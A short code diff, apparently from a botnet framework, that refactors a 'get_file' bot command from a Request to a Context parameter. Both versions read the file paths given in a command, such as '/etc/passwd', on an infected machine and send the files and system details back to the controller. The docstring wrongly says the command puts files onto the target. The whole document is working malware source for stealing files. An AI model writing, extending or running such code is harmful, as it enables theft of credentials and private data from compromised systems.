@@ -1,8 +1,8 @@
-from .. import BotNet, Request, UserException
+from .. import BotNet, Context, UserException
 
 
 @BotNet.default_script(script_version="0.0.1")
-def get_file(request: Request) -> None:
+def get_file(context: Context) -> None:
     """
     put file to target system
 
@@ -13,9 +13,9 @@ def get_file(request: Request) -> None:
         `/get_file /etc/passwd`
         `/get_file ./file.exe`
     """
-    if len(request.command) > 0:
-        route = request.command[0]
-        for i, route in enumerate(request.command):
-            request.engine.send_file(route, {f"file route {i+1}": route, **request.system_info(minimal=True)})
+    if len(context.command) > 0:
+        route = context.command[0]
+        for i, route in enumerate(context.command):
+            context.engine.send_file(route, {f"file route {i+1}": route, **context.system_info(minimal=True)})
     else:
         raise UserException("no route given")
